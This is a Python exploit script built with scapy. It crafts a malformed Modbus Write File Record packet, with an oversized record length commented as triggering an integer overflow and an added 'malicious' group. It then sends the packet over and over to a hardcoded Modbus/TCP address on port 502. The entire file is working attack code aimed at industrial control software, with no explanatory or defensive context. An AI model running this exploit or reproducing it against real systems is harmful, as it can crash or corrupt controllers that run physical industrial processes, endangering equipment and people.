from scapy.all import *
from scapy.contrib.modbus import *
import time
import socket
import struct

def create_exploit_packet():
    # Modbus Write File Record header
    function_code = 0x15
    byte_count = 0x0d  # 13 bytes of data

    # Sub-request header
    reference_type = 0x06
    file_number = 0x0001
    record_number = 0x0000
    record_length = 0xfffe  # Trigger integer overflow

    # Payload
    payload = struct.pack('>BBHHHH', 
                          function_code,
                          byte_count,
                          reference_type,
                          file_number,
                          record_number,
                          record_length)
    
    # Add malicious second "group"
    payload += struct.pack('>H', 0xfffb)
    
    # Pad to reach minimum Modbus PDU length
    payload += b'\x00' * (253 - len(payload))

    return payload

exploit_packet = create_exploit_packet()

# Create a socket and connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.103.152.8", 502))   # IP and port
ss = StreamSocket(s, Raw)

try:
    while True:
        # Create Modbus TCP packet with the exploit payload
        modbus_tcp = ModbusTCP()/Raw(load=exploit_packet)
        
        # Send the packet and receive response
        response = ss.sr1(modbus_tcp)
        
        if response:
            print("Response received:")
            response.show()
        else:
            print("No response received")
        
        time.sleep(1)
except KeyboardInterrupt:
    print("Stopped by user")
except Exception as e:
    print(f"Error: {e}")
finally:
    s.close()
    print("Connection closed")